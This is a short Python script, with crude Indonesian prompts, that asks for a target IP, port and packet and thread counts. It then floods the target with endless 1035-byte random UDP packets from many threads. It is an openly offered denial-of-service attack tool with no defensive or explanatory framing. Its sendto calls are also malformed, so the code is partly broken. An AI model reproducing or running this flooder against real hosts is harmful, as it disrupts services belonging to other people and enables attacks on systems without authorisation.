import random
import socket
import threading
import os,sys


print("Justest")

p1 = str(input("Ip Bwang  : "))
p2 = int(input("Portnya bwang  : "))
p3 = int(input("Paketnya : "))
p4 = int(input("Bonus Paket  : "))
os.system("clear")
def titid():
    pepek = random._urandom(1035)        
    while True:
        try:
            s = socket.socket(socket.AF_INET , socket.SOCK_DGRAM)
            s.connect((p1,p2))
            s.sendto(pepek)
            for x in range(p3):
                s.sendto(pepek)
            print("gabut anjg yah nembus")
        except:
            print("Down hmm!!!")
            
for y in range(p4):
    th = threading.Thread(target=titid)
    th.start()  
